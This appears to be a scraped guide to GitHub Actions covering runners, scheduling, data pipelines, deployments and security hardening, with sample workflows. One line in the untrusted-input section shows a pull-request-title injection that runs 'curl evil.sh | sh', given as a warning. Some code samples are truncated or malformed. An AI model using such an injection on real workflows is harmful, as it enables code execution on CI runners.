    GitHub Actions is a computer you already own and never have to run.

    Event-driven automation with ephemeral VMs, a scheduler, a secrets store, an artifact store, a cache, an OIDC identity provider, and a static host — all attached to the repository that already holds your code and data. The Overhead celestial refresh proved the useful part: unattended ETL that publishes validated datasets into Git, with the commit history as the audit trail. This manual covers the rest of the machine: everything it can do, what it costs, where it breaks, and where it is the wrong tool.

    ① AccountPersonal settings: Actions permissions, billing, budgets, runner costs. Personal repos inherit from here.
    ② Organization / EnterpriseOptional layer: policy defaults, allowed actions, runner groups, org secrets, budgets, self-hosted infrastructure.
    ③ RepositoryThe working level: workflow files, secrets/variables, environments, Pages, rulesets, retention, token defaults.
    ④ Workflow runPer execution: jobs, steps, logs, annotations, artifacts, the live token's permissions, and the deployment record.

    Who can do what (and where that is enforced)

    RoleActions-relevant powers
    readSee runs, logs, artifacts, and the workflow YAML (public repos: everyone)
    triageEverything above, plus cancel and re-run workflows
    writePush workflow files, trigger workflow_dispatch, create releases, and spend runner minutes — anyone with write access can run Actions, and the repository owner is billed
    maintainManage Actions settings and repository configuration (without full admin)
    adminSecrets, variables, environments, runners, Pages, rulesets, retention, token defaults, billing visibility

    Spending is the trap: write access implies the ability to consume minutes. On private repositories that is billable, so a budget is a permission control as much as a financial one.

    Precedence when several levels disagree

    1. Enterprise / organization policy sets the ceiling — allowed actions, whether Actions is permitted at all, maximum token permissions, retention caps, runner-group access.
    2. Repository settings can only narrow that ceiling (default workflow permissions, retention, fork approval).
    3. Workflow file then narrows or adjusts again with its top-level permissions:.
    4. Job and step permissions: and env: override within their scope.
    5. Event-specific adjustment happens last: a pull_request from a fork, or any Dependabot-triggered run, has write permissions downgraded to read and cannot read secrets.
    Consequence "It worked on my branch" and "it fails on a PR from a fork" is usually step 5, not your YAML. The fix is not broader permissions; it is a two-workflow design (pull_request to test, workflow_run to publish).

    How Actions Works — the actual machine

    Actions is an event-driven job scheduler with elastic, disposable execution targets. Everything else — marketplaces, badges, matrices, environments — is convenience built on two ideas: something happens, GitHub evaluates declarative YAML, allocates a machine, and throws the machine away. Internalise the disposal and most surprising behaviour becomes obvious.

    Vocabulary, precisely

    TermWhat it isThe subtlety that bites
    EventA trigger: push, schedule, dispatch, webhook, API callSome events only fire if the workflow exists on the default branch — published, not merely committed to a branch

    Lifecycle of one execution

    01EventPush, cron tick, dispatch, webhook, API call
    02Workflow evaluationWhich files match? Branch, path and type filters; dispatch needs the file on the default branch
    03Permission resolutionOrg/repo policy → workflow permissions: → fork and Dependabot downgrade to read-only
    04Queue & concurrencyConcurrency groups, plan-level job slots, runner availability — the origin of "delayed"
    05Runner allocationA stock image boots fresh; anything you installed last time is gone
    06Materialise the workspaceactions/checkout clones the triggering SHA
    07Setup stepsRuntimes, restored caches, service containers
    08Execute stepsShell and actions in order; outputs, annotations and step summaries emitted
    09Persist by choiceArtifacts, caches, Git commits, releases, Pages, external storage
    10TeardownFilesystem, containers, environment and token are destroyed
    The one-sentence model Each job is a fresh machine that performs steps and can only affect the future through Git refs, artifacts, caches and external systems. Everything else evaporates at step 10.

    Persistence boundaries — what survives a job

    Dies with the runnerFilesystem and /tmp · installed apt/pip/npm packages · Docker images and containers · environment variables and GITHUB_ENV values · exported shell state · the OIDC token and GITHUB_TOKEN · background processes and open sockets
    Survives, by explicit actionGit commits and tags pushed to the remote · workflow artifacts (retention-bound) · caches keyed by hash (evictable) · release assets · container/package registries · Pages deployments · anything written to an external API, bucket or database
    Survives implicitly, and is often forgottenThe run record itself: logs, step summaries, annotations, timing, the token's permission set, and — if you use environments — the deployment history and approval trail
    The classic mistake A second job that assumes the first job's files exist. Jobs are separate machines: pass data through actions/upload-artifact + download-artifact (or a commit, or an external store), or do the work in one job with needs: only for ordering.

    Isolation, honestly

    • DocumentedA GitHub-hosted runner executes one job and is then decommissioned; ubuntu-slim containers run unprivileged with hypervisor-level isolation.
    • DocumentedContainer jobs and service containers share the VM kernel. A container is not a security boundary against a privileged step in the same job.
    • Plan-dependentLarger runners can be organization-scoped with access control and static IP ranges; they require Team or Enterprise Cloud — they are unavailable to personal accounts.
    • VerifySelf-hosted runners persist by design. GitHub's guidance is not to attach them to public repositories, because fork pull requests can run code on your machine.

    Where the minutes actually go

    Billed minutes are wall-clock from job start to job end. Queue waiting is not billed; runner-allocation delay is still real latency.

    • Fixed overhead10–40 s before your first step: allocation, image boot, checkout
    • Dependency install20 s–4 min uncached; seconds when the cache hits
    • Checkout depthfetch-depth: 0 on a repository with 295 MB of data costs real seconds — the Overhead workflow pays it deliberately
    • RoundingMinutes round up per job, so 40 one-second jobs cost 40 minutes, not 40 seconds

    Runner Infrastructure — the disposable computer

    This is the part worth experimenting with. A GitHub-hosted runner is a fully provisioned machine (or container) that exists for one job, has a broad toolchain preinstalled, has outbound internet, and is destroyed afterwards. Treat it as a disposable workstation you can summon by pushing a commit — and treat its limits as hard edges rather than inconveniences.

    Runner comparison

    Filter by availability. Specifications are documented for standard GitHub-hosted runners; larger-runner sizes are organization-provisioned and priced per minute (see Costs & Quotas). Empty cells mean "not offered in that configuration", not "unknown".

    Reading the labels

    • ubuntu-latestCurrently Ubuntu 24.04. The alias is a promise of "current stable", not a fixed image — it will move to 26.04 when GitHub promotes it.
    • ubuntu-24.04Pinned to a major OS version. OS patches ship as image updates within that version.
    • ubuntu-24.04-armNative ARM64. Free for public repositories — the cheapest route to real ARM builds.
    • windows-2025 / windows-11-armARM Windows runners exist now; useful for cross-architecture testing without emulation.
    • macos-latest / macos-15-intelApple silicon and Intel macOS are separate labels with different bottlenecks: macOS jobs are scarce (5 concurrent on Free/Pro/Team, 50 on Enterprise) and ~10× the Linux per-minute rate.
    • ubuntu-slimSingle-CPU container runner for lightweight automation. Unprivileged: no Docker-in-Docker, no mounting filesystems, minimal preinstalled tooling.

    Larger runners — what money buys

    • Plan-dependentTeam and Enterprise Cloud only; included minutes cannot be spent on larger runners, and larger runners are never free for public repositories.
    • Sizesx64 Linux 2/4/8/16/32/64/96-core; Windows 4–96-core; arm64 Linux 2–64-core; GPU 4-core Linux/Windows; macOS 12-core and 5-core M2 Pro.
    • RatesLinux 4-core $0.012/min, 8-core $0.022, 16-core $0.042, 32-core $0.082, 64-core $0.162; Windows 4-core $0.022; macOS 12-core $0.077; GPU 4-core Linux $0.052. Provisioning idle runners costs nothing.
    • ExtrasOptional static IP ranges, custom images (which then bill at the runner rate plus image storage), and org-level access control.

    Container jobs and service containers

    • Container job (jobs.<id>.container): your steps run inside a Docker image you choose, on a Linux VM. Deterministic toolchains, no setup-* steps, reproducible by digest.
    • Service container (jobs.<id>.services): Postgres, MySQL, Redis, MinIO, LocalStack — started before your steps with health checks and reachable by hostname on the job network.
    • What breaks: macOS and Windows runners cannot run container jobs; networking differs between the VM and the container, so localhost in a container job means the container; Docker-in-Docker needs a VM runner.
    • Cost note: the container job still bills as a Linux runner, and pulling a large image each run is billed wall-clock unless you cache it.

    Self-hosted runners and runner groups

    • You register your own machine (or an ARC/ Kubernetes scale set) and label it; jobs request it with runs-on: [self-hosted, linux, x64, gpu].
    • Free of per-minute charges — you pay for the machine. This is the economic escape hatch for long builds.
    • Security posture changes completely. The filesystem persists between jobs, so one job can read another's leftovers. Never attach a self-hosted runner to a public repository unless you have thought hard about forks.
    • Runner groups control which repositories (and which orgs, on enterprise) may use a set of runners — the blunt instrument for "only the production repo may deploy".

    Images move; plan for it

    • Runner images are refreshed on a rolling basis and the job log prints the exact image version at the top — that log line is your only ground truth for "which image ran this?"
    • -latest aliases move; version labels move slower. If a build broke "for no reason", compare the image version in the last good and first bad run.
    • Preinstalled languages coexist in multiple versions. Do not rely on the default: actions/setup-node, setup-python and friends make the intended version explicit.
    • For real reproducibility, a container job pinned by digest is stronger than any runner label.

    Network, egress and reachability

    • Outbound internet: yes. This is what makes the Overhead pipeline possible — SBDB, Horizons, COBS, IMO and PyPI are all reachable from a runner.
    • Inbound: no. There is no public address and nothing can connect to a running job. Long-poll and webhook architectures do not fit.
    • GitHub publishes weekly-updated runner IP ranges via GET /meta, but allowlisting them is discouraged; larger runners with static IPs or self-hosted runners are the supported answer.
    • The runner must reach a documented set of GitHub domains; a job that hangs on checkout but works elsewhere is usually a proxy or egress rule.

    Diagnostic workflow — summon a machine and interrogate it

    Copy this to .github/workflows/runner-diagnostics.yml, then run it from Actions → Runner diagnostics → Run workflow. It reports OS, CPU, memory, disk, tool versions, Docker availability and network reachability — and prints nothing sensitive: environment names are filtered and secret values are never echoed. 

    name: Runner diagnostics

# Manual only: this workflow exists to be run on purpose, never on every push.
on:
  workflow_dispatch:
    inputs:
      target:
        description: Runner label to inspect
        type: choice
        default: ubuntu-latest
        options: [ubuntu-latest, ubuntu-24.04-arm, windows-latest, macos-latest, ubuntu-slim]

permissions:
  contents: read          # nothing here writes anything

jobs:
  inspect:
    runs-on: ${{ inputs.target }}
    timeout-minutes: 10
    steps:
      - name: Who and where am I
        shell: bash
        run: |
          echo "runner label : ${{ inputs.target }}"
          echo "os / arch    : $RUNNER_OS $RUNNER_ARCH"
          uname -a || true
          echo "image        : ${ImageOS:-} ${ImageVersion:-}"
          echo "workspace    : $GITHUB_WORKSPACE"
          echo "temp         : $RUNNER_TEMP"

      - name: CPU, memory and disk
        shell: bash
        run: |
          echo "--- cpu ---";    nproc 2>/dev/null || sysctl -n hw.ncpu
          echo "--- memory ---"; free -h 2>/dev/null || vm_stat | head -5
          echo "--- disk ---";   df -h / /tmp 2>/dev/null | sed -n '1,6p'

      - name: Toolchain inventory
        shell: bash
        run: |
          for t in git node npm python3 pip3 docker jq curl gh sqlite3 psql ffmpeg; do
            if command -v "$t" >/dev/null 2>&1; then
              printf '%-9s %s\n' "$t" "$("$t" --version 2>&1 | head -1)"
            else
              printf '%-9s (not installed)\n' "$t"
            fi
          done

      - name: Docker capability probe
        shell: bash
        run: |
          if docker info >/dev/null 2>&1; then
            echo "docker daemon: reachable"
            docker run --rm hello-world | head -3
          else

    Where experimentation ends and policy begins

    Not acceptable use A persistent service, VPN endpoint, proxy pool, mining workload, or any capacity unrelated to the repository's own software project. Public-repo minutes are free on the assumption that you are building, testing and publishing that project.
    • Fine: build, test, lint, publish, generate data your project serves, scrape an upstream feed whose output your project needs, evaluate your own code.
    • Also fine: running a tool for a few minutes purely to learn what the runner can do — it terminates and costs nothing.
    • Not fine: anything that is really free compute for something else, especially if it never terminates or is not tied to the repository.

    Choosing a runner, step by step

    1. Need macOS or Windows APIs? The decision is made — budget for it, since those minutes cost roughly 2–10× Linux.
    2. Need Docker or sudo? Then you need a VM runner, not ubuntu-slim.
    3. Short, low-dependency task (notify, validate JSON, flip a flag)? ubuntu-slim at $0.002/min is the cheapest correct answer.
    4. Building for ARM? ubuntu-24.04-arm beats emulation in both minutes and money.
    5. Heavy build (compilers, multi-GB images, 20+ minutes)? Cache, then split jobs, then consider self-hosted — in that order.
    6. Approaching the 6-hour job ceiling? Restructure; the ceiling is not negotiable on hosted runners.

    How filters compose

    • Branch/tag filters (branches, branches-ignore, tags) accept globs: main, releases/**, v1.*.
    • Path filters (paths, paths-ignore) mean "only when these files change" — the most effective way to cut wasted minutes in a repository carrying 295 MB of data.
    • Activity types (types:) narrow events with sub-kinds, e.g. issue_comment: types: [created].
    • Combining: with both branches and paths, both must match — a classic cause of "why did nothing run?".
    • Expression guards in jobs (if:) evaluate after the event fires, so they save runtime, not queue slots.
    • Deliberate skips: [skip ci] in a commit message; paths-ignore for documentation churn.

    Trust, per event class

    • Safe defaultpush, schedule, workflow_dispatch, release, workflow_call — your code, your ref, deliberate triggers.

    YAML mistakes that only appear in Actions

    • on is a YAML key, not a boolean. Quoting it ("on":) is harmless; relying on YAML 1.1 parsers is not.
    • ${{ }} inside a run: string is substituted before the shell sees it. That is convenient and it is the main injection vector — pass untrusted values through env: instead of interpolating them into script text.

    • Secrets cannot be used in if: at the step level. Compare a mapped env value instead.
    • Tabs are illegal. The bundled validator flags them; Actions reports a parse error with a line number you can trust.

    Scheduled Automation — cron you can trust as far as it goes

    schedule: is what turns a repository into unattended compute. It is also the feature with the weakest guarantees: cron here means "GitHub will try, soon", not "exactly at 06:23". Design every scheduled job as if it may run late, run twice, or skip entirely — all three happen.

    What is guaranteed (and what is not)

    • DocumentedPOSIX five-field cron in UTC only; the shortest interval is once every five minutes.
    • DocumentedScheduled workflows run on the latest commit of the default branch and use that branch's version of the workflow file. No other ref participates.
    • DocumentedRuns can be delayed under load; the top of the hour is the classic congestion window — which is why the Overhead refresh sits at :23 past the hour rather than on it.
    • DocumentedCron fires are not retried. If a run fails, nothing brings it back — idempotent reruns plus a manual trigger are the answer.
    • VerifyScheduled workflows are disabled after prolonged repository inactivity (documented as 60 days), with a notification; re-enabling is one click. Any human activity prevents it.

    Design rules for scheduled pipelines

    1. Be idempotent. Safe to run twice: recompute from sources, or detect "nothing changed" and exit 0 without committing. The Overhead workflow hashes artifacts before and after and only commits when changed=1.
    2. Always ship a manual trigger. workflow_dispatch beside schedule lets you reproduce a failure on demand instead of waiting a day.
    3. Serialize with concurrency. cancel-in-progress: false stops an overrun from racing the next tick on the same files.
    4. Commit only what changed, with a message that says what.
    5. Validate before publishing — write, validate, then swap. The repository should never hold a half-validated artifact.
    6. Fail loudly. A silent scheduled failure is worse than a red build, because nobody is watching.
    7. Bound upstream usage. Respect quotas and terms, back off on 429s, never hammer a public endpoint from a cron loop.

    The Overhead schedule, line by line

    on:
  schedule:
    - cron: '23 6 * * *'      # daily: comet catalog, ephemerides and reported brightness
    - cron: '17 6 1 * *'      # monthly: re-check the annual meteor shower calendar
  workflow_dispatch:
    inputs:
      target:
        description: Which dataset to rebuild
        type: choice
        options: [comets, meteors, both]
        default: both

concurrency:
  group: overhead-data
  cancel-in-progress: false
    • Two cron entries in one file, disambiguated inside jobs by github.event.schedule == '17 6 1 * *' — one workflow, two cadences.
    • cancel-in-progress: false is correct here: cancelling mid-run could leave a partially written artifact, and overlap costs minutes rather than correctness.
    • Manual dispatch with a choice input means the monthly job can be run out of band without editing YAML.
    • Because scheduled runs execute the default branch's copy of the file, changing the schedule requires the change to land on main.
    • Both crons are offset from the hour (:23, :17) — a deliberate choice against the congested top of the hour.

    Diagnosing a schedule that stopped

    1. Actions tab: is the workflow disabled? There is a banner and an "Enable workflow" button.
    2. Did the file get renamed or moved? Schedule identity follows the path.
    3. Was the last run a failure? A failed run still schedules the next tick; a disabled workflow never does.
    4. Is the cron what you think it is? 23 6 * * * is 06:23 UTC = 01:23 US Eastern in winter. Paste it into the cron playground above.
    5. Has anything (including the bot) happened in the repository in the last 60 days?
    6. Is a concurrency group still held by a stuck run? Cancel it and dispatch manually to prove the pipeline is healthy.

    Data Pipelines — Actions as a scheduled ETL platform

    The Overhead celestial refresh is the reference implementation: a cron trigger, an ephemeral Ubuntu runner, Python that fetches JPL SBDB, JPL Horizons, COBS and the IMO calendar, validation gates, and a bot commit publishing JSON that a static page reads. No server, no database, no deploy step, and git log as the run history. This section explains that architecture, then generalises it to datasets that do not belong in Git.

    The eight moving parts

    1 · Triggerschedule at 23 6 * * * plus workflow_dispatch with a target choice — manual reruns are the primary debugging tool.
    2 · Ephemeral runnerUbuntu VM, 45-minute timeout, discarded afterwards. The pipeline must work from an empty machine, which is exactly why it is reproducible.
    3 · Checkoutfetch-depth: 0: full history so a rebase-and-push can reconcile against upstream instead of failing on a shallow clone.
    4 · RetrievePython with pinned dependencies (pypdf==6.16.2, requests==2.32.3) against four upstreams. Pinning matters: an ETL job that breaks because a PDF parser changed is a bad morning.
    5 · Transform & validateAtomic writes plus a hard gate: --check, --no-network, and a precision test suite. Failed validation means nothing is committed.
    6 · CommitOnly when bytes changed (sha256 before/after), as overhead-data-bot, naming the artifact paths and the fixture explicitly.
    7 · PublishPages serves the repository as-is: the commit is the deployment. That is what removes the deploy step entirely.
    8 · Audit & rollbackCommit history is the run log, git revert is the rollback, and each artifact carries its own retrieval timestamps and digests for provenance.

    How the workflow enforces each guarantee

    • Never publish unvalidated data: validation runs after the refresh steps and before the commit, as a hard gate — so a failure leaves the last good dataset serving.
    • Don't hide retrieval failures: refresh steps use continue-on-error: true (so both datasets are attempted); a later step checks steps.*.outcome and fails the run while leaving committed artifacts untouched.
    • Don't commit noise: sha256sum before/after, and the commit step is gated on if: env.changed == '1'.
    • Say what happened: two steps append Markdown to $GITHUB_STEP_SUMMARY, so the run page answers "what did it do?" without opening logs.
    • Handle legitimate drift: when JPL republishes solutions or COBS gains observations, the pinned fixture goes stale. The workflow detects the drift and re-pins only then — the checks stay exact rather than being loosened.
    • Serialize: concurrency: overhead-data with cancel-in-progress: false prevents two ticks from racing on the same files.

    Why this shape works so well

    • No owned infrastructureNo host to patch, no cron daemon, no log rotation, no credential file on disk — the machine is rebuilt from a published image daily.
    • Free at this scalePublic repository + standard runner: minutes and storage are free. The whole Overhead data system costs $0/month.
    • Provenance for freeWho wrote this file, when, from which upstream, and what changed — answered by commands you already know.
    • Failure is safeA failed run publishes nothing and the site keeps serving the previous dataset. That is a design property (validate → commit), not luck.
    • Three independent recordsRunner log, step summary, and the diff all describe the same run.

    Where the output should live

    The most consequential decision in a pipeline is the persistence target. Language, runner and schedule are reversible; this one changes the repository's shape.

    Non-negotiables for any pipeline

    • IdempotentRun it twice; the second finds nothing to change and exits 0. Overhead gets this from sha256 comparison before committing.
    • Change detectionCompare with the previous artifact, not with "did the fetch succeed" — upstreams happily return identical data.
    • Validation gateSchema, ranges, counts, sanity envelope. The failure mode should be "old data still serving", never "half a file".
    • CheckpointsFor multi-stage work, persist intermediates so a late failure does not repeat expensive retrieval.
    • Upstream mannersIdentifiable User-Agent, backoff on 429/5xx, request budgets, cache unchanged payloads.
    • Partial-failure policyDecide explicitly: publish nothing, publish what succeeded, or raise a stale flag. Silence is the only wrong answer.
    • RetentionIf it accumulates (snapshots, archives), cap by age and count, and delete children with parents.
    • Provenance stampWrite generated_at, source URLs, upstream identifiers and digests into each artifact — future-you will diff them.

    Pipeline patterns worth stealing

    • Poll cheaply first: fetch metadata (ETag, version field, max date) and download the payload only when it moved.
    • Snapshot + diff: keep yesterday's artifact and report when the delta is unusual — a poor man's anomaly detector.
    • Two-stage publish: gather in job A (upload artifact), validate in job B (download artifact), commit only after the gate passes. Separation keeps the gate honest.
    • Generate, then render: pipeline writes JSON, the site renders it, so design changes never require a data rerun.
    • Current plus archive: current.json with archive/YYYY-MM.json and explicit retention — history without unbounded growth.
    • Failure snapshot: on failure, upload the raw upstream response as an artifact; debugging a parser later is far easier with the exact bytes.

    Matrices without regret

    • strategy.matrix multiplies jobs: the ceiling is 256 jobs per run, and your plan caps concurrency.
    • fail-fast: false for the full picture across versions; leave it on when the first failure is enough.
    • max-parallel stops a 12-cell matrix from evicting everybody else's queue slots.
    • include: / exclude: add one special case (a single ARM job) to a uniform matrix.
    • Cross-OS matrices are the expensive ones: macOS ≈ 10× Linux, Windows ≈ 1.7×. Justify each axis.
    • Do not matrix what you can parameterise: five Python × four OS × three Node is 60 jobs; usually one lint job plus two real axes suffices.

    Making CI a gate instead of a ritual

    1. Required status checks. A ruleset on main naming specific jobs turns red checks into a blocked merge. Without it, CI is advisory.
    2. Set them per job. A required check whose job was renamed blocks merges forever — update the ruleset when you rename.
    3. Bypass deliberately. Letting the data bot bypass is reasonable when its workflow validates; a blanket admin bypass is not.
    4. Gate deploys on tests. needs: [test] is a structural guarantee; "we usually run tests first" is not.
    5. Consider merge queue if concurrent PRs keep producing stale-merge surprises.

    Deployments & Releases — publishing with brakes

    A deployment is a promise about the outside world. Actions supplies three useful brakes — an environment that can require a human, a checkout of exactly the commit you tested, and a deployment record that outlives the run — plus OIDC so the credential need not exist between runs.

    Publishing Pages: branch source vs Actions source

    Branch source — what Junkdrawer uses

    Pages serves the chosen branch (here main). Every commit is a deployment, including the bot's data commits. No workflow, no artifact, no deploy job. The 10-builds-per-hour soft limit applies.

    The cost: you cannot gate a deployment, test before publishing, or transform content — and a broken commit is live immediately. git revert is a fast rollback, not an instant one.

    Actions source — custom workflow

    You build and upload an artifact, then deploy through the github-pages environment. Tests can gate the publish, the artifact is explicit, and the deployment is recorded with a URL.

    The cost: more moving parts, a build that can fail, and the Pages deployment queue is now part of your release latency.

    name: Deploy Pages

on:
  push:
    branches: [main]
  workflow_dispatch:

permissions:
  contents: read             # read the repository
  pages: write               # create the deployment
  id-token: write            # mint the OIDC token deploy-pages needs

concurrency:
  group: pages
  cancel-in-progress: false  # never cancel a deployment mid-flight

jobs:
  build:
    runs-on: ubuntu-latest
    timeout-minutes: 15
    steps:
      - uses: actions/checkout@v7
      - name: Configure Pages
        uses: actions/configure-pages@v6
      - name: Assemble the site
        run: |
          mkdir -p _site
          rsync -a --delete --exclude '.git' --exclude '_site' ./ _site/
      - name: Validate before publishing
        run: |
          .agents/skills/junkdrawer-compliance-audit/scripts/audit.sh
          test -f _site/index.html
      - name: Upload the Pages artifact
        uses: actions/upload-pages-artifact@v5
        with:
          path: _site

  deploy:
    needs: build             # nothing publishes unless the build job passed
    runs-on: ubuntu-latest
    environment:
      name: github-pages
      url: ${{ steps.deployment.outputs.page_url }}
    steps:
      - name: Deploy
        id: deployment
        uses: actions/deploy-pages@v5
    • The Pages artifact must be a gzipped tar of one directory — under 10 GB, with no symbolic or hard links.
    • Deployments time out after 10 minutes; a huge site is a build problem, not a deploy problem.
    • deploy-pages requires pages: write and id-token: write; the environment is what attaches the URL and any protection rules.
    • needs: build is the entire point: validation runs before publication, not after.
    • Version note: GitHub's docs show configure-pages@v5, upload-pages-artifact@v4 and deploy-pages@v4; the action repositories had released v6 / v5 / v5 by 2026-10-10. Check the action's releases page and pin deliberately.

    Releases without ceremony

    name: Release

on:
  push:
    tags: ['v*.*.*']

permissions:
  contents: write      # create the release and attach assets

jobs:
  release:
    runs-on: ubuntu-latest
    timeout-minutes: 20
    steps:
      - uses: actions/checkout@v7
        with: { fetch-depth: 0 }     # generated notes need history
      - name: Build the artifact
        run: |
          tar -czf "dist-${GITHUB_REF_NAME}.tar.gz" data/overhead
      - name: Create the release
        env:
          GH_TOKEN: ${{ github.token }}

          gh release create "$GITHUB_REF_NAME" \

            --generate-notes \
            dist-*.tar.gz
    • Tag-triggered releases give you immutable, addressable snapshots — the honest home for versioned datasets users fetch by name.
    • --generate-notes builds release notes from merged PRs and commit ranges; it is a good default and a poor substitute for a human summary on major releases.
    • Assets count as storage. Deleting a release frees the space but does not refund accrued billing for the cycle.
    • Immutable releases (once published, assets cannot be replaced) are worth enabling for anything people depend on.

    GitHub as a Data Platform — repository as source and sink

    The idea worth internalising: a repository can hold the automation, the datasets, the publication target and the audit log, with Git supplying versioning, attribution and rollback for free. It stops being a good idea at a specific size, and knowing where that line sits is the whole skill.

    What Git gives you as a data store

    • Immutable, attributed historyEvery dataset version has an author, timestamp, message and diff — a data catalogue nobody had to build.
    • Cheap rollbackReverting a bad publish is a new commit; consumers see it on the next fetch.
    • Branch stagingA branch can carry a proposed dataset and a preview; merging promotes it, and environments can gate the merge.
    • Auditability"Why does this number differ from yesterday?" is answered by git log -p data/overhead/comets.json.
    • ProvenanceArtifact carries sources and digests; commit carries the run; run page carries the log.
    • Schema evolutionAdditive fields plus a schema_version beats a migration framework at this scale.

    Where Git becomes the wrong tool

    • Big binariesParquet/PMTiles/imagery bloats every clone forever. The 295 MB of Parquet in this working tree is correctly ignored and served from R2.
    • High-frequency rewritesA 15-minute cadence on a multi-MB file creates thousands of near-identical blobs — cost and noise for no benefit.
    • Concurrent writersTwo workflows writing the same file produce rejected pushes; Git has no merge strategy for generated JSON.
    • Real deletionHistory keeps what you removed. If deletion is a requirement, store elsewhere.
    • Serving at scalePages is a static host: 1 GB site cap, ~100 GB/month soft bandwidth. Not a dataset CDN.
    • Artifacts as storageThey expire (default 90 days) and are not addressable by your site.

    The concurrency problem this repository actually hit

    Automating commits turns a repository into a multi-writer system. Until the Overhead workflow existed, origin/main only moved when a human or a local agent pushed. Now a bot pushes on a schedule, which means a local checkout can be behind before a session even starts, and a push can be rejected by a commit nobody made locally.

    How the git-sync contract fits

    This repository answered the race with a policy in AGENTS.md plus a helper, .agents/skills/junkdrawer-git-sync/scripts/git-sync.sh, that is deliberately smaller than a Git framework:

    • check — fetches and reports branch, upstream, ahead/behind, incoming commits, unpushed commits, modified tracked files and untracked files.
    • sync — fast-forwards only when nothing local is at risk; refuses on divergence and (unless explicitly allowed) on a dirty tree.
    • pre-push — the gate: exits non-zero unless the outgoing history is built on the latest upstream.
    • verify — confirms the remote actually contains the commit after a push.

    Exit codes are the interface: 0 safe, 1 needs attention, 2 usage, 3 cannot verify (fetch failed) — a failed fetch blocks rather than pretending everything is fine.

    What that buys an autonomous agent

    • Automation commits are legitimateThe policy states explicitly that bot commits are not disposable artifacts — they must be preserved and merged, never reverted for convenience.
    • A rejection is informationNon-fast-forward is defined as a synchronization signal, not an error to bypass. That single sentence removes the main reason agents reach for --force.
    • Untracked work is sacredThe helper reports untracked files and never deletes them; it also never runs reset, clean, stash, checkout or rebase.
    • Verification is part of publishing"Push succeeded" and "the remote has it" are different claims; the contract requires the second.
    • Bounded blast radiusBecause the bot only writes data/overhead/** and one fixture, a rebase before pushing almost never conflicts — the invariant is what makes the policy practical rather than aspirational.

    AI & Agent Automation — using compute without handing over the keys

    Actions is excellent at the boring half of an AI workflow: scheduled evaluation runs, regression checks over generated output, report generation, documentation refresh. It is dangerous at the exciting half — executing model-authored code with repository write access — and the fix is architecture, not caution.

    Patterns that work well

    • Scheduled evaluation sweeps. Cron runs your evaluator against pinned fixtures and commits a JSON report; the trend line over weeks is the artifact that matters.
    • Regression gates on generated content. Validate schema, ranges and required fields before publishing, and fail the run when a metric degrades past a threshold.
    • Documentation refresh. Regenerate a data-derived page and open a PR for review rather than pushing to main.
    • Release summaries. On tag, draft a summary from commits and open a draft release — a human approves the words.
    • Static report generation. Model calls happen with a purpose-scoped key; the output is an artifact, not a live service.

    Patterns that need brakes

    • Executing model-authored code. Assume it is hostile: a job with contents: read, no secrets, a short timeout, and no write access of any kind.
    • Letting a model decide a mutation. Put an environment with required reviewers in front of anything that commits, deploys, emails or spends.
    • Feeding PR content to a model that can write. Titles, bodies and diffs are attacker-controlled. Keep analysis read-only; let a separate workflow_run workflow do the writing.
    • Pasting secrets into prompts. A secret in a prompt is a secret in a third-party log. Redact, or use an intermediary known not to log payloads.

    Untrusted input: the specific mechanics

    1. Injection through interpolation. run: echo "${{ github.event.pull_request.title }}" lets a title like "; curl evil.sh | sh # execute. Pass it via env: and reference "$TITLE" instead.
    2. Fork PR privileges. pull_request from a fork gets a read-only token and no secrets. That is a feature; do not "fix" it by switching to pull_request_target.
    3. Cache poisoning. A cache written by an untrusted run can be restored by a trusted one. Scope cache keys to trust level and never let a cache influence a privileged step.
    4. Artifact poisoning. Artifacts are untrusted data: a publishing step must validate what it downloads, never execute it.
    5. Checkout of attacker refs. Since actions/checkout v7, fetching a fork's head/merge ref inside pull_request_target or workflow_run is refused by default; the escape hatch is named allow-unsafe-pr-checkout.

    Scheduled evaluation harness — a shape worth reusing

    name: Nightly evaluation sweep

on:
  schedule:
    - cron: '41 3 * * *'      # deliberately off the hour
  workflow_dispatch:

permissions:
  contents: write            # commits the report, nothing else
  actions: read

concurrency:
  group: eval-nightly
  cancel-in-progress: false

jobs:
  evaluate:
    runs-on: ubuntu-latest
    timeout-minutes: 30
    env:
      EVAL_API_KEY: ${{ secrets.EVAL_API_KEY }}   # purpose-scoped provider key
    steps:
      - uses: actions/checkout@v7
        with: { fetch-depth: 0 }

      - uses: actions/setup-node@v7
        with: { node-version: '22', cache: npm }

      - run: npm ci --no-audit --no-fund

      - name: Run the evaluation
        run: node tools/run-eval.js --fixtures tests/fixtures/eval --out /tmp/report.json

      - name: Validate the report before publishing
        run: |
          node -e "
            const r = require('/tmp/report.json');
            if (!Array.isArray(r.cases)) throw new Error('report.cases must be an array');
            if (r.cases.length < 40) throw new Error('too few cases: ' + r.cases.length);
            if (typeof r.passRate !== 'number') throw new Error('missing passRate');
          "

      - name: Publish the report
        run: |
          mkdir -p data/eval
          cp /tmp/report.json "data/eval/$(date -u +%Y-%m-%d).json"
          git config user.name  'eval-bot'
          git config user.email 'eval-bot@users.noreply.github.com'
          git add data/eval
          git diff --cached --quiet || git commit -m "Nightly eval report $(date -u +%Y-%m-%d)"
          git pull --rebase --autostash        # reconcile with any bot commit first
          git push

      - name: Fail loudly on a regression
        if: always()
        run: |
          node -e "
            const r = require('/tmp/report.json');
            if (r.passRate < 0.9) { console.error('passRate', r.passRate); process.exit(1); }
          "

    Note the ordering: the report is published before the regression check, because the artifact is what you need to diagnose the failure — and if: always() keeps the check honest even if an earlier step wobbled. The run still ends red.

    Cloudflare & External Services — Actions as the orchestrator

    When part of a system already lives on Cloudflare (Workers, R2, D1, Pages), Actions is a good home for the batch, build and publish steps — the work that is not latency-sensitive. The split that matters is what runs on a GitHub schedule versus what runs at the edge, and how each side's credential is scoped.

    • Publish release metadata. Write a JSON manifest of dataset versions to R2 or KV so the app knows what exists without listing buckets.
    • Trigger remote processing. Call a Worker endpoint that fans out to queues or Durable Objects: Actions starts the batch, the edge does the concurrency.

    Secrets, Identity & Security — least privilege, mechanically

    The security model reduces to three questions: who can trigger this run, what token does it hold, and what can that token reach. Every hardening measure below makes one of those answers narrower than it was by default.

    Permission scopes you will actually use

    Secrets and variables: scope, limits, masking illusion

    • Three scopes. Repository, environment, organization. Environment secrets are readable only by jobs that declare that environment — which is what makes an approval gate meaningful.
    • Write-only values. You can list names, never read values; rotating means writing a new value.
    • Masking is best-effort. Exact matches are masked in logs; base64'd, reversed, split or URL-embedded copies are not. Never print a secret "to debug".
